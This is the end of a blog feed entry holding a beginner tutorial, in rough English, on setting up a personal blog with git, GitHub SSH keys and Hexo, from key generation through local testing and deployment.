&lt;p&gt;Tip:This name and email will use when your update your blog code into github.&lt;br&gt;You can check your set.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$git config --lis&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Now begin to create your ssh key.&lt;br&gt;Check the folder “.ssh” exists.&lt;br&gt;windows addr: C:\Users\angoddess.ssh&lt;br&gt;linux addr: ~/.ssh&lt;br&gt;Delete this folder and create your key.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ssh-keygen -t rsa -C &amp;quot;447375410@qq.com&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Follow the tip to enter, you will get two file “id_rsa” and “id_rsa.pub”.&lt;br&gt;Now open the id_rsa.pub to copy the ssh key and put it on your github.&lt;br&gt;&lt;img src=&quot;/uploads/1/1-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;Write your key title and key value to add.&lt;br&gt;&lt;img src=&quot;/uploads/1/1-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;Finally, you can test it.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ssh git@github.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/1/1-9.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Fourth-Install-the-hexo-and-get-all-file-to-your-workspace&quot;&gt;&lt;a href=&quot;#Fourth-Install-the-hexo-and-get-all-file-to-your-workspace&quot; class=&quot;headerlink&quot; title=&quot;Fourth: Install the hexo and get all file to your workspace.&quot;&gt;&lt;/a&gt;Fourth: Install the hexo and get all file to your workspace.&lt;/h2&gt;&lt;p&gt;Install hexo must to install node. Node Download&lt;br&gt;Open git shell.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$npm install -g hexo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Create your workspace’s folder and get hexo.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$cd /d/git/github&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$mkdir angoddess&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$hexo init&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/1/1-10.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Finally-Test-the-blog-on-localhost-and-update-it-into-github&quot;&gt;&lt;a href=&quot;#Finally-Test-the-blog-on-localhost-and-update-it-into-github&quot; class=&quot;headerlink&quot; title=&quot;Finally: Test the blog on localhost and update it into github.&quot;&gt;&lt;/a&gt;Finally: Test the blog on localhost and update it into github.&lt;/h2&gt;&lt;p&gt;Generate static pages.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Test the blog on localhost.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/1/1-11.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;Update it into github must be set deploy.&lt;br&gt;Open file “_config.yml”.&lt;br&gt;Addr: D:\git\github\Hexo_config.yml&lt;br&gt;Rewrite the deploy like this.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;deploy:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  type: git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  repository: https://github.com/Angoddess/angoddess.github.io&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  branch: master&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Here you will input your username and email.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/1/1-12.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Here I will teach you how to bulid your personal blog by github.&lt;br&gt;Tools: git | github | hexo&lt;br&gt;
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="network" scheme="http://yoursite.com/tags/network/"/>
    
  </entry>
  
</feed>
